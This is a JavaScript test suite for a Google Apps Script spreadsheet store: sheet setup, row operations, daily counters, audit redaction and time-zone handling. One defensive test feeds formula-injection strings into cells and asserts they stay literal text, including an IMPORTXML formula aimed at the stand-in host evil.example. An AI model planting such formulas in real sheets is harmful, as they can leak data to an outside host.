'use strict';
// 03_store.js + 04_audit.js — header-mapped rows, settings, daily counters, pack sheets.
const { test } = require('node:test');
const assert = require('node:assert/strict');
const H = require('./harness/gas-mocks');

test('ensureSheets creates every core tab with the exact headers and drops the default Sheet1', () => {
  const { ctx, state } = H.loadGas({ pack: 'hello' });
  H.bootstrap(ctx, state);
  const ss = ctx.getSpreadsheet();
  assert.deepEqual([...ss.getSheets()].map((s) => s.getName()).sort(), ['AuditLog', 'Flows', 'PendingActions', 'Queue', 'Requests', 'Settings']);
  assert.deepEqual([...ctx.sheetHeaders(ss.getSheetByName('Requests'))], [...ctx.SHEET_HEADERS.Requests]);
  assert.equal(ctx.ensureSheets().length, 0, 'second run creates nothing');
});

test('store primitives: append → get → update → delete; objects are JSON in cells; dates come back as ISO', () => {
  const { ctx, state } = H.loadGas({ pack: 'hello' });
  H.bootstrap(ctx, state);
  const a = ctx.storeAppend('Settings', { key: 'k1', value: { n: 1 }, updated_at: new Date('2026-01-02T03:04:05Z') });
  assert.equal(a._row, 2);
  assert.equal(a.value, '{"n":1}');
  assert.equal(a.updated_at, '2026-01-02T03:04:05.000Z');
  ctx.storeAppend('Settings', { key: 'k2', value: 'v2' });
  assert.equal(ctx.storeAll('Settings').length, 2);
  assert.equal(ctx.storeFind('Settings', (r) => r.key === 'k2')[0]._row, 3);
  const row = ctx.storeAppend('Queue', { id: 'q_1', kind: 'x', status: 'new' });
  assert.equal(ctx.storeGet('Queue', 'q_1').status, 'new');
  assert.equal(ctx.storeUpdateById('Queue', 'q_1', { status: 'done' }).status, 'done');
  assert.equal(ctx.storeUpdateById('Queue', 'nope', { status: 'done' }), null);
  assert.equal(ctx.storeUpsertById('Queue', { id: 'q_1', kind: 'y' }).kind, 'y');
  assert.equal(ctx.storeUpsertById('Queue', { id: 'q_2', kind: 'z' })._row, row._row + 1);
  assert.equal(ctx.storeDeleteRows('Queue', [2]), 1);
  assert.deepEqual([...ctx.storeAll('Queue')].map((r) => r.id), ['q_2']);
  assert.equal(ctx.storeCount('Queue', (r) => r.kind === 'z'), 1);
});

test('settings: get/set upsert, daily counters reset on the next local day', () => {
  const { ctx, state } = H.loadGas({ pack: 'hello', tz: 'Asia/Tokyo', now: '2026-03-01T14:30:00Z' }); // 23:30 JST, Mar 1
  H.bootstrap(ctx, state);
  assert.equal(ctx.settingGet('missing', 'dflt'), 'dflt');
  ctx.settingSet('a', '1', 'note'); ctx.settingSet('a', '2');
  assert.equal(ctx.settingGet('a'), '2');
  assert.equal(ctx.storeFind('Settings', (r) => r.key === 'a').length, 1, 'upsert, not append');
  assert.equal(ctx.storeFind('Settings', (r) => r.key === 'a')[0].note, 'note', 'note kept when omitted');
  assert.equal(ctx.settingIncrDaily('wakes'), 1);
  assert.equal(ctx.settingIncrDaily('wakes'), 2);
  assert.equal(ctx.settingDailyCount('wakes'), 2);
  ctx.__TEST_NOW = '2026-03-01T15:30:00Z'; // 00:30 JST, Mar 2 — still Mar 1 in UTC
  assert.equal(ctx.settingDailyCount('wakes'), 0, 'local day rolled over');
  assert.equal(ctx.settingIncrDaily('wakes'), 1);
});

test('pack sheets: registerSheet adds a tab and extra columns on a core tab; audit survives a missing Sheet', () => {
  const { ctx, state } = H.loadGas({ pack: 'hello' });
  ctx.registerSheet('HelloLog', ['id', 'note']);
  ctx.registerSheet('AuditLog', ['pack_col']);
  const r = ctx.audit('early', 'ref', { x: 1 });
  assert.equal(r.event, 'early', 'audit before setup returns the row without throwing');
  assert.match(state.logs.join('\n'), /AUDIT\(unpersisted\)/);
  H.bootstrap(ctx, state);
  assert.deepEqual([...ctx.sheetHeaders(ctx.getSheet('HelloLog'))], ['id', 'note']);
  assert.equal(ctx.sheetHeaders(ctx.getSheet('AuditLog')).slice(-1)[0], 'pack_col');
  ctx.audit('later', 'ref', 'secret 123456:TESTTOKENTESTTOKENTESTTOKEN here', true, 'test');
  const rows = ctx.storeAll('AuditLog');
  assert.equal(rows[rows.length - 1].event, 'later');
  assert.equal(rows[rows.length - 1].actor, 'test');
  assert.ok(!rows[rows.length - 1].detail_json.includes('TESTTOKENTESTTOKEN'), 'bot token value redacted in audit detail');
  ctx.auditFail('bad', '', null);
  assert.equal(ctx.storeAll('AuditLog').slice(-1)[0].ok, 'false');
});


test('getSpreadsheet keeps the Sheet on the owner zone once per zone, so date cells read back as the day written', () => {
  const { ctx, state } = H.loadGas({ pack: 'hello' });
  H.bootstrap(ctx, state);
  const ss = ctx.getSpreadsheet();
  const props = () => ctx.PropertiesService.getScriptProperties();
  props().setProperty(ctx.PROP.TIMEZONE, 'America/Los_Angeles');
  ss.setSpreadsheetTimeZone('America/New_York');
  ctx._HB_SS_CACHE = null;
  ctx.getSpreadsheet();
  assert.equal(ss.getSpreadsheetTimeZone(), 'America/Los_Angeles', 'the Sheet follows TIMEZONE');
  assert.equal(props().getProperty(ctx.PROP.SHEET_TZ), 'America/Los_Angeles');
  assert.equal(ctx.syncSheetTimeZone(ss), false, 'nothing to do once the zone is recorded');
  props().setProperty(ctx.PROP.TIMEZONE, 'Asia/Tokyo');
  assert.equal(ctx.syncSheetTimeZone(ss), true, 'a changed TIMEZONE syncs again');
  assert.equal(ss.getSpreadsheetTimeZone(), 'Asia/Tokyo');
});

test('free text never becomes a formula: = + - @ and a leading apostrophe go in as literal text and read back unchanged', () => {
  const { ctx, state } = H.loadGas({ pack: 'hello' });
  H.bootstrap(ctx, state);
  const nasty = ['=IMPORTXML("https://evil.example/","//a")', '+1+1', '-2+3', '@SUM(A1)', "'quoted", '\tTAB', 'plain', '2+2=4'];
  nasty.forEach((v, i) => ctx.storeAppend('Settings', { key: 'k' + i, value: v }));
  const sh = ctx.getSheet('Settings');
  assert.deepEqual([...sh.formulas], [], 'no cell was written as a live formula');
  assert.deepEqual([...ctx.storeAll('Settings')].map((r) => r.value), nasty, 'reads give the text back exactly');
  const a = ctx.storeAppend('Settings', { key: 'x', value: '=1+1' });
  assert.equal(a.value, '=1+1', 'append returns the logical value, not the escaped one');
  // An update rewrites the whole row: a formula-looking cell it did not touch must stay text too.
  const u = ctx.storeUpdate('Settings', a._row, { note: '=HYPERLINK("x")' });
  assert.equal(u.value, '=1+1');
  assert.equal(u.note, '=HYPERLINK("x")');
  assert.deepEqual([...sh.formulas], []);
  assert.equal(ctx.storeGet('Queue', 'none'), null);
  assert.equal(ctx.storeAppend('Settings', { key: 'n', value: -5 }).value, -5, 'numbers stay numbers');
});

// Developed by: LightAISolutions
